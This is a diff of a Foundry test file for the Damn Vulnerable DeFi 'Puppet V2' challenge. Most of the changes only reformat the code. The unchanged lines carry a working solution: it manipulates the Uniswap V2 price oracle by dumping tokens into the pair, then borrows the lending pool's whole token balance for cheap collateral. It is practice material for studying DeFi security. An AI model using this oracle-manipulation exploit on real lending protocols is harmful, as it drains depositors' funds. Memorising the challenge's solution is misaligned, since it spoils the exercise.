@@ -2,13 +2,13 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
-import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
-import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
-import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
-import {WETH} from "solmate/tokens/WETH.sol";
-import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import { Test, console } from "forge-std/Test.sol";
+import { IUniswapV2Pair } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import { IUniswapV2Factory } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import { IUniswapV2Router02 } from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import { WETH } from "solmate/tokens/WETH.sol";
+import { DamnValuableToken } from "../../src/DamnValuableToken.sol";
+import { PuppetV2Pool } from "../../src/puppet-v2/PuppetV2Pool.sol";
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -48,18 +48,27 @@ contract PuppetV2Challenge is Test {
 
         // Deploy Uniswap V2 Factory and Router
         uniswapV2Factory = IUniswapV2Factory(
-            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
+            deployCode(
+                string.concat(
+                    vm.projectRoot(),
+                    "/builds/uniswap/UniswapV2Factory.json"
+                ),
+                abi.encode(address(0))
+            )
         );
         uniswapV2Router = IUniswapV2Router02(
             deployCode(
-                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
+                string.concat(
+                    vm.projectRoot(),
+                    "/builds/uniswap/UniswapV2Router02.json"
+                ),
                 abi.encode(address(uniswapV2Factory), address(weth))
             )
         );
 
         // Create Uniswap pair against WETH and add liquidity
         token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
-        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
+        uniswapV2Router.addLiquidityETH{ value: UNISWAP_INITIAL_WETH_RESERVE }({
             token: address(token),
             amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
             amountTokenMin: 0,
@@ -67,11 +76,17 @@ contract PuppetV2Challenge is Test {
             to: deployer,
             deadline: block.timestamp * 2
         });
-        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));
+        uniswapV2Exchange = IUniswapV2Pair(
+            uniswapV2Factory.getPair(address(token), address(weth))
+        );
 
         // Deploy the lending pool
-        lendingPool =
-            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));
+        lendingPool = new PuppetV2Pool(
+            address(weth),
+            address(token),
+            address(uniswapV2Exchange),
+            address(uniswapV2Factory)
+        );
 
         // Setup initial token balances of pool and player accounts
         token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
@@ -86,12 +101,23 @@ contract PuppetV2Challenge is Test {
     function test_assertInitialState() public view {
         assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
         assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
-        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
+        assertEq(
+            token.balanceOf(address(lendingPool)),
+            POOL_INITIAL_TOKEN_BALANCE
+        );
         assertGt(uniswapV2Exchange.balanceOf(deployer), 0);
 
         // Check pool's been correctly setup
-        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
-        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
+        assertEq(
+            lendingPool.calculateDepositOfWETHRequired(1 ether),
+            0.3 ether
+        );
+        assertEq(
+            lendingPool.calculateDepositOfWETHRequired(
+                POOL_INITIAL_TOKEN_BALANCE
+            ),
+            300000 ether
+        );
     }
 
     /**
@@ -104,12 +130,23 @@ contract PuppetV2Challenge is Test {
         address[] memory path = new address[](2);
         path[0] = address(token);
         path[1] = address(weth);
-        uint256[] memory previewOut = uniswapV2Router.getAmountsOut(tokenSold, path);
-        uint256[] memory out = uniswapV2Router.swapExactTokensForTokens(tokenSold, previewOut[1], path, player, block.timestamp);
+        uint256[] memory previewOut = uniswapV2Router.getAmountsOut(
+            tokenSold,
+            path
+        );
+        uint256[] memory out = uniswapV2Router.swapExactTokensForTokens(
+            tokenSold,
+            previewOut[1],
+            path,
+            player,
+            block.timestamp
+        );
         assertEq(previewOut[0], out[0]);
         assertEq(previewOut[1], out[1]);
-        uint256 wethInput = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-        weth.deposit{value: player.balance}();
+        uint256 wethInput = lendingPool.calculateDepositOfWETHRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        weth.deposit{ value: player.balance }();
         weth.approve(address(lendingPool), wethInput);
         lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
         token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
@@ -118,8 +155,17 @@ contract PuppetV2Challenge is Test {
         path[0] = address(weth);
         path[1] = address(token);
         // weth.balanceOf(player) < out[1]
-        previewOut = uniswapV2Router.getAmountsOut(weth.balanceOf(player), path);
-        out = uniswapV2Router.swapExactTokensForTokens(weth.balanceOf(player), previewOut[1], path, player, block.timestamp);
+        previewOut = uniswapV2Router.getAmountsOut(
+            weth.balanceOf(player),
+            path
+        );
+        out = uniswapV2Router.swapExactTokensForTokens(
+            weth.balanceOf(player),
+            previewOut[1],
+            path,
+            player,
+            block.timestamp
+        );
         assertEq(previewOut[0], out[0]);
         assertEq(previewOut[1], out[1]);
     }
@@ -128,7 +174,15 @@ contract PuppetV2Challenge is Test {
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
     function _isSolved() private view {
-        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
-        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(address(lendingPool)),
+            0,
+            "Lending pool still has tokens"
+        );
+        assertEq(
+            token.balanceOf(recovery),
+            POOL_INITIAL_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 }
